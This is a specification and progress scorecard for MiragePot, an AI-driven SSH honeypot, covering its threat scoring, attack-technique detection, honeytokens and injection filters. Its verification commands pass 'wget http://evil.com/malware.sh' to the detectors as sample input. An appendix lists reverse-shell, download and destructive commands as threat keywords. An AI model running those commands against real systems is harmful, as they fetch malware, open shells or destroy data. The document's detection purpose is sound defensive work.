# MiragePot MVP Baseline

This document defines the Minimum Viable Product (MVP) specification for MiragePot, providing a baseline to measure the project's current state and track progress.

**Author:** Evin Brijesh  
**Created:** January 2026  
**Version:** 2.0 (Updated with Advanced Features)

---

## Table of Contents

1. [MVP Specification](#1-mvp-specification)
2. [MVP Checklist](#2-mvp-checklist)
3. [MVP Scorecard](#3-mvp-scorecard)
4. [Advanced Features](#4-advanced-features)
5. [How to Use This Document](#5-how-to-use-this-document)
6. [Evaluation History](#6-evaluation-history)

---

## 1. MVP Specification

### 1.1 Project Overview

**MiragePot** is an AI-Driven Adaptive SSH Honeypot that simulates a realistic Linux terminal using a local LLM. The MVP must demonstrate:

- A functional SSH honeypot accepting connections
- AI-powered command response generation
- Basic threat detection and logging
- A monitoring dashboard

### 1.2 Core Features (Required for MVP)

#### 1.2.1 SSH Server
| Feature | Description | Priority | Status |
|---------|-------------|----------|--------|
| SSH Protocol | Paramiko-based SSH server | Critical | ✅ |
| Authentication | Accept any username/password | Critical | ✅ |
| Port Configuration | Configurable port (default: 2222) | Critical | ✅ |
| Host Key | Auto-generate or load existing | Critical | ✅ |
| Session Handling | Support multiple concurrent sessions | Critical | ✅ |
| Terminal Emulation | Basic PTY-like behavior | High | ✅ |
| SSH Fingerprinting | Capture client version, algorithms, fingerprint | High | ✅ |

#### 1.2.2 Command Handling
| Feature | Description | Priority | Status |
|---------|-------------|----------|--------|
| Command Parsing | Parse and route incoming commands | Critical | ✅ |
| Cache System | Fast responses for common commands | Critical | ✅ |
| LLM Integration | AI-generated responses for unknown commands | Critical | ✅ |
| Fake Filesystem | In-memory filesystem simulation | High | ✅ |
| Built-in Commands | pwd, cd, ls, cat, mkdir, touch, rm, echo | High | ✅ |
| Exit Handling | Proper session termination on exit/logout | High | ✅ |
| TTY Emulation | Full terminal with history, tab completion, ANSI | High | ✅ |

#### 1.2.3 AI/LLM Integration
| Feature | Description | Priority | Status |
|---------|-------------|----------|--------|
| Ollama Connection | Connect to local Ollama instance | Critical | ✅ |
| Model Support | Support phi3 model (minimum) | Critical | ✅ |
| System Prompt | Customizable system prompt | High | ✅ |
| Response Cleaning | Remove LLM artifacts from output | High | ✅ |
| Fallback Mode | Graceful degradation when LLM unavailable | High | ✅ |
| Prompt Injection Protection | Detect and block manipulation attempts | High | ✅ |
| Anti-Hallucination Guardrails | Validate responses for realism | High | ✅ |

#### 1.2.4 Security & Defense
| Feature | Description | Priority | Status |
|---------|-------------|----------|--------|
| Threat Scoring | Score commands based on risk keywords | High | ✅ |
| Tarpit Delays | Slow down high-threat commands | Medium | ✅ |
| Input Validation | Validate command names | High | ✅ |
| No Real Execution | Commands never execute on host | Critical | ✅ |
| TTP Detection | MITRE ATT&CK technique detection | High | ✅ |

#### 1.2.5 Logging & Monitoring
| Feature | Description | Priority | Status |
|---------|-------------|----------|--------|
| Session Logging | JSON logs for each session | Critical | ✅ |
| Command Logging | Log all commands with timestamps | Critical | ✅ |
| Threat Score Logging | Record threat scores | High | ✅ |
| Dashboard | Web-based monitoring interface | High | ✅ |
| Session Overview | List all sessions | High | ✅ |
| Command Timeline | View commands per session | High | ✅ |
| Download Capture | Log file download attempts | High | ✅ |

### 1.3 Required Components

#### 1.3.1 Package Structure
```
MiragePot/
├── miragepot/              # Core Python package
│   ├── __init__.py         # Package initialization
│   ├── __main__.py         # CLI entry point
│   ├── config.py           # Configuration management
│   ├── server.py           # SSH server
│   ├── ssh_interface.py    # SSH protocol handling + fingerprinting
│   ├── command_handler.py  # Command processing + injection defense
│   ├── ai_interface.py     # LLM integration
│   ├── defense_module.py   # Threat detection
│   ├── tty_handler.py      # Full TTY/terminal emulation
│   ├── filesystem.py       # Enhanced filesystem with metadata
│   ├── system_state.py     # Fake process/network state
│   ├── download_capture.py # File download detection
│   ├── ttp_detector.py     # MITRE ATT&CK TTP analysis
│   ├── response_validator.py # Anti-hallucination guardrails
│   ├── honeytokens.py      # Deception artifacts/credential tracking
│   └── session_export.py   # Session export and replay
├── dashboard/              # Web dashboard
│   └── app.py              # Streamlit app
├── data/                   # Data files
│   ├── cache.json          # Cached responses
│   ├── system_prompt.txt   # LLM prompt
│   └── logs/               # Session logs
├── tests/                  # Test suite (558+ tests)
└── docs/                   # Documentation
```

#### 1.3.2 Configuration Files
| File | Purpose | Required | Status |
|------|---------|----------|--------|
| `pyproject.toml` | Modern Python packaging | Yes | ✅ |
| `requirements.txt` | Dependencies list | Yes | ✅ |
| `.env.example` | Configuration template | Yes | ✅ |
| `.gitignore` | Git ignore rules | Yes | ✅ |
| `Makefile` | Common commands | Recommended | ✅ |

#### 1.3.3 Documentation Files
| File | Purpose | Required | Status |
|------|---------|----------|--------|
| `README.md` | Project overview, quick start | Yes | ✅ |
| `LICENSE` | License file | Yes | ✅ |
| `CONTRIBUTING.md` | Contribution guidelines | Recommended | ✅ |
| `docs/INSTALL.md` | Installation guide | Recommended | ✅ |
| `docs/CONFIGURATION.md` | Configuration reference | Recommended | ✅ |
| `docs/USAGE.md` | Usage guide | Recommended | ✅ |

### 1.4 Test Coverage

| Category | Tests | Description |
|----------|-------|-------------|
| Command Handler | 51 | Built-in commands, injection detection |
| Defense Module | 25 | Threat scoring, delay logic |
| SSH Interface | 17 | SSH fingerprinting, authentication |
| TTY Handler | 36 | Terminal emulation, key handling |
| Filesystem | 37 | File operations, metadata, find |
| System State | 58 | Process, network, memory simulation |
| Download Capture | 89 | Download detection, risk classification |
| TTP Detector | 72 | Attack stage detection, MITRE mapping |
| Response Validator | 88 | Anti-hallucination checks |
| Honeytokens | 56 | Token generation, access tracking |
| Session Export | 29 | Export formats, replay |
| **TOTAL** | **558** | All tests passing |

### 1.5 Quality Standards

| Metric | MVP Target | Current |
|--------|------------|---------|
| Python Version | 3.10+ | ✅ 3.10+ |
| Code Style | PEP 8 compliant | ✅ |
| Type Hints | Public functions | ✅ All functions |
| Docstrings | All modules, classes | ✅ All functions |
| Test Coverage | 40% | ✅ 558 tests |

---

## 2. MVP Checklist

Use this checklist to track MVP completion. Mark items with `[x]` when complete.

### 2.1 Core Functionality

#### SSH Server
- [x] SSH server starts and listens on configured port
- [x] Accepts any username/password combination
- [x] Handles multiple concurrent connections
- [x] Auto-generates host key if not exists
- [x] Proper session cleanup on disconnect
- [x] Configurable host and port
- [x] SSH client fingerprinting and metadata capture

#### Command Handling
- [x] Commands are parsed correctly
- [x] Cache lookup works for known commands
- [x] Unknown commands fall back to LLM
- [x] Built-in `pwd` command works
- [x] Built-in `cd` command works
- [x] Built-in `ls` command works (with flags)
- [x] Built-in `cat` command works
- [x] Built-in `mkdir` command works
- [x] Built-in `touch` command works
- [x] Built-in `rm` command works
- [x] Built-in `echo` with redirection works
- [x] `exit` and `logout` close session
- [x] Empty commands return prompt

#### Fake Filesystem
- [x] Session state initialized with directories
- [x] Session state initialized with decoy files
- [x] Path normalization works
- [x] Files can be created/deleted in session
- [x] Directories can be created in session
- [x] Current working directory tracked
- [x] File metadata (permissions, timestamps, ownership)
- [x] stat, chmod, chown commands

#### AI/LLM Integration
- [x] Connects to Ollama successfully
- [x] Queries LLM with system prompt
- [x] Cleans LLM response artifacts
- [x] Detects AI/chatbot phrases in responses
- [x] Falls back gracefully when Ollama unavailable
- [x] Startup check reports Ollama status
- [x] Response validation for realism

#### Security
- [x] Prompt injection patterns detected (80+ patterns)
- [x] Natural language commands rejected
- [x] Valid command names validated
- [x] Threat scores calculated for commands
- [x] Tarpit delays applied for high-threat commands
- [x] No real command execution on host
- [x] Encoded injection detection (base64, hex, leetspeak)

### 2.2 Logging & Monitoring

#### Session Logging
- [x] Each session creates a JSON log file
- [x] Log includes session ID
- [x] Log includes attacker IP
- [x] Log includes login timestamp
- [x] Log includes all commands
- [x] Log includes responses
- [x] Log includes threat scores
- [x] Log includes delay applied
- [x] Log includes SSH fingerprint
- [x] Log includes download attempts
- [x] Log includes TTP summary
- [x] Log includes honeytokens summary

#### Dashboard
- [x] Dashboard loads successfully
- [x] Shows list of all sessions
- [x] Shows session statistics (total, commands, IPs)
- [x] Shows command timeline for selected session
- [x] Shows threat score with color coding
- [x] Manual refresh works
- [x] Auto-refresh option available

### 2.3 Configuration

- [x] Environment variables supported
- [x] `.env` file loading works
- [x] SSH host configurable
- [x] SSH port configurable
- [x] LLM model configurable
- [x] LLM temperature configurable
- [x] Log level configurable
- [x] Config accessible via `get_config()`

### 2.4 CLI & Entry Points

- [x] `python run.py` starts honeypot + dashboard
- [x] `python -m miragepot` works
- [x] `miragepot` CLI command works (after install)
- [x] `--port` option works
- [x] `--host` option works
- [x] `--dashboard` option works
- [x] `--log-level` option works
- [x] `--version` shows version
- [x] `--help` shows help

### 2.5 Packaging & Distribution

- [x] `pyproject.toml` exists and is valid
- [x] `requirements.txt` lists all dependencies
- [x] `pip install -e .` works
- [x] Package version defined
- [x] Author information included
- [x] License specified
- [x] Entry points configured

### 2.6 Documentation

- [x] `README.md` has project description
- [x] `README.md` has installation instructions
- [x] `README.md` has quick start guide
- [x] `README.md` has usage examples
- [x] `LICENSE` file exists
- [x] `CONTRIBUTING.md` exists
- [x] `.env.example` documents all options
- [x] `docs/INSTALL.md` exists
- [x] `docs/CONFIGURATION.md` exists
- [x] `docs/USAGE.md` exists

### 2.7 Testing

- [x] `tests/` directory exists
- [x] `tests/__init__.py` exists
- [x] `tests/conftest.py` with fixtures exists
- [x] Command handler tests exist (51 tests)
- [x] Defense module tests exist (25 tests)
- [x] Tests can be run with `pytest`
- [x] 558+ test cases total

### 2.8 Code Quality

- [x] All Python files have module docstrings
- [x] Public functions have docstrings
- [x] No syntax errors in any file
- [x] Imports work correctly
- [x] `.gitignore` properly configured
- [x] No secrets committed

---

## 3. MVP Scorecard

### 3.1 Category Scores

| Category | Total Items | Completed | Score |
|----------|-------------|-----------|-------|
| SSH Server | 7 | 7 | 100% |
| Command Handling | 13 | 13 | 100% |
| Fake Filesystem | 8 | 8 | 100% |
| AI/LLM Integration | 7 | 7 | 100% |
| Security | 7 | 7 | 100% |
| Session Logging | 12 | 12 | 100% |
| Dashboard | 7 | 7 | 100% |
| Configuration | 8 | 8 | 100% |
| CLI & Entry Points | 9 | 9 | 100% |
| Packaging | 7 | 7 | 100% |
| Documentation | 10 | 10 | 100% |
| Testing | 7 | 7 | 100% |
| Code Quality | 6 | 6 | 100% |
| **TOTAL** | **108** | **108** | **100%** |

### 3.2 Current Evaluation

**Date:** January 2026  
**Evaluator:** AI Assistant

| Metric | Value |
|--------|-------|
| Total Checklist Items | 108 |
| Items Completed | 108 |
| Raw Completion | 100% |
| Test Count | 558 |
| MVP Readiness Level | **Production Ready** |

#### Strengths
- Comprehensive test coverage (558 tests)
- Full TTY emulation with realistic terminal behavior
- Advanced security features (TTP detection, honeytokens)
- Session export and replay capabilities
- Anti-hallucination guardrails for LLM responses

---

## 4. Advanced Features

MiragePot includes the following advanced features beyond the basic MVP:

### 4.1 SSH Fingerprinting (Feature 1)
**File:** `miragepot/ssh_interface.py` | **Tests:** 17

Captures detailed SSH client metadata:
- Client version string
- Key exchange algorithms
- Cipher preferences
- MAC algorithms
- Compression settings
- Client fingerprint hash

### 4.2 Full TTY/Prompt Realism (Feature 2)
**File:** `miragepot/tty_handler.py` | **Tests:** 36

Complete terminal emulation:
- Command history (up/down arrows)
- Tab completion for commands and files
- Cursor movement and line editing
- Control characters (Ctrl+C, Ctrl+D, Ctrl+L)
- ANSI escape sequence handling
- Realistic bash-like prompts

### 4.3 Enhanced Fake Filesystem (Feature 3)
**File:** `miragepot/filesystem.py` | **Tests:** 37

Realistic filesystem simulation:
- File metadata (permissions, ownership, timestamps)
- `stat`, `chmod`, `chown` commands
- `find` command with filters
- `ls -la` with proper formatting
- Directory timestamps

### 4.4 Fake Process/System State (Feature 4)
**File:** `miragepot/system_state.py` | **Tests:** 58

Simulated system information:
- `ps`, `top` with realistic process lists
- `netstat`, `ss` with network connections
- `free` with memory information
- `uptime`, `w`, `who` commands
- `uname`, `hostname`, `id`, `whoami`

### 4.5 File Download Capture (Feature 5)
**File:** `miragepot/download_capture.py` | **Tests:** 89

Captures download attempts:
- Detects wget, curl, scp, tftp, ftp, rsync
- Extracts URLs, filenames, destinations
- Classifies risk level
- Generates realistic fake output
- Logs for forensics

### 4.6 TTP Detection (Feature 6)
**File:** `miragepot/ttp_detector.py` | **Tests:** 72

MITRE ATT&CK analysis:
- Maps commands to techniques (T1059, T1105, etc.)
- Tracks attack stages (recon → execution → exfil)
- Command chain analysis
- Risk level calculation
- Attack summary generation

### 4.7 Anti-Hallucination Guardrails (Feature 7)
**File:** `miragepot/response_validator.py` | **Tests:** 88

Validates LLM responses:
- Detects AI revelation phrases (50+ patterns)
- Detects conversational starters (40+ patterns)
- Checks filesystem/user consistency
- Removes markdown artifacts
- Provides standardized error templates

### 4.8 Enhanced Prompt Injection Defense (Feature 8)
**File:** `miragepot/command_handler.py` | **Tests:** 51 (14 new)

Comprehensive injection protection:
- 80+ injection patterns
- XML/HTML-style markers
- Jailbreak patterns (DAN, god mode, etc.)
- Encoded injections (base64, hex, URL)
- Leetspeak and character splitting
- Multi-language patterns (Chinese, Russian)

### 4.9 Honeytokens (Feature 9)
**File:** `miragepot/honeytokens.py` | **Tests:** 56

Deception artifacts:
- Per-session unique tokens
- AWS credentials, API keys, passwords
- GitHub, Slack, Stripe tokens
- JWT secrets, SSH key snippets
- Access tracking and logging
- Exfiltration detection
- Generated file content (.env, passwords.txt, AWS credentials)

### 4.10 Session Export & Replay (Feature 10)
**File:** `miragepot/session_export.py` | **Tests:** 29

Export and replay sessions:
- Text transcript export
- JSON export (pretty/compact)
- HTML export with styling
- Session replay with timing
- Iterator-based replay API
- Session listing and management

---

## 5. How to Use This Document

### 5.1 Verification Commands

```bash
# Check package imports
python -c "from miragepot import __version__; print(__version__)"

# Check config
python -c "from miragepot.config import get_config; print(get_config().ssh.port)"

# Check command handler
python -c "from miragepot.command_handler import handle_command, init_session_state; s = init_session_state(); print(handle_command('pwd', s))"

# Check defense module
python -c "from miragepot.defense_module import calculate_threat_score; print(calculate_threat_score('wget http://evil.com'))"

# Check honeytokens
python -c "from miragepot.honeytokens import init_honeytokens; ht = init_honeytokens('test'); print(list(ht.tokens.keys()))"

# Check TTP detector
python -c "from miragepot.ttp_detector import init_ttp_state, analyze_command; s = init_ttp_state(); analyze_command('wget http://evil.com/malware.sh', s); print(s.current_stage)"

# Run all tests
pytest tests/ -v

# Run tests with coverage
pytest tests/ -v --tb=short | tail -20

# Check CLI
python -m miragepot --help

# Verify syntax
python -m py_compile miragepot/*.py
```

---

## 6. Evaluation History

Track evaluations over time to measure progress.

| Date | Evaluator | Tests | Features | Notes |
|------|-----------|-------|----------|-------|
| Jan 2026 | Initial | ~50 | 5 | MVP baseline |
| Jan 2026 | Update | 473 | 8 | Added features 1-8 |
| Jan 2026 | Final | 558 | 10 | All advanced features complete |

---

## Appendix A: Cache Requirements

The MVP cache (`data/cache.json`) should include responses for at least these commands:

```
whoami, id, hostname, uname, uname -a, uname -r,
date, uptime, w, who, last, 
ps, ps aux, top,
df, df -h, free, free -h,
ifconfig, ip addr, netstat -tuln,
cat /etc/passwd, cat /etc/hosts, cat /etc/os-release,
env, printenv, echo $PATH, echo $HOME, echo $USER
```

**Minimum:** 30 cached commands  
**Recommended:** 50+ cached commands

---

## Appendix B: Decoy Files with Honeytokens

The fake filesystem includes these decoy files with session-unique honeytokens:

| Path | Purpose | Honeytokens |
|------|---------|-------------|
| `/etc/passwd` | Standard passwd file | - |
| `/etc/os-release` | OS information | - |
| `/root/notes.txt` | Hints to other files | - |
| `/root/passwords.txt` | Fake credentials | admin_password |
| `/root/.aws/credentials` | AWS credentials | aws_creds |
| `/root/.aws/config` | AWS config | - |
| `/var/www/html/.env` | Web app secrets | internal_api, db_password, jwt_secret, stripe_api |
| `/var/www/html/config.php` | PHP config | db_password, stripe_api |
| `/home/user/Documents/creds.txt` | User credentials | - |
| `/opt/legacy_backup/db_backup.sql` | Database backup | - |

---

## Appendix C: Threat Keywords

The defense module scores these patterns:

| Risk Level | Keywords |
|------------|----------|
| Low (5-10) | ls, pwd, whoami, id, cat |
| Medium (20-40) | sudo, chmod, chown, ssh, rsync |
| High (50-70) | wget, curl, nc, nmap, scp |
| Critical (80+) | bash -i, python -c, rm -rf, dd, mkfs |

---

## Appendix D: MITRE ATT&CK Techniques Detected

| Technique ID | Name | Trigger Commands |
|--------------|------|------------------|
| T1059 | Command and Scripting Interpreter | bash, sh, python, perl |
| T1082 | System Information Discovery | uname, hostname, cat /etc/*-release |
| T1083 | File and Directory Discovery | ls, find, locate |
| T1087 | Account Discovery | cat /etc/passwd, whoami, id |
| T1105 | Ingress Tool Transfer | wget, curl, scp, tftp |
| T1046 | Network Service Scanning | nmap, nc, netcat |
| T1070 | Indicator Removal | rm, history -c, unset |
| T1048 | Exfiltration Over Alternative Protocol | nc, curl POST, scp |

---

*End of MVP Baseline Document*
